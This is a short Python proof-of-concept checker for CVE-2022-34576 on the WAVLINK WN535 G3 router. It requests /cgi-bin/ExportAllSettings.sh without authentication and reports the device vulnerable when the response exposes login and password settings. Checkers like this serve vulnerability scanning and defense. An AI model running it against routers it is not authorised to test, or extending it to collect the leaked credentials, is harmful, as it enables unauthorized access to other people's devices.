# title: WAVLINK WN535 G3 安全漏洞 CVE-2022-34576
# author: antx
# cveid: CVE-2022-34576

from poctools import BasicPoc


class APoc(BasicPoc):
    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f"{url}/cgi-bin/ExportAllSettings.sh"
        try:
            resp = self.get(target)
            if resp.status_code == 200 and 'Login=' in resp.text and 'Password=' in resp.text and 'Model=' in resp.text and 'AuthMode=' in resp.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
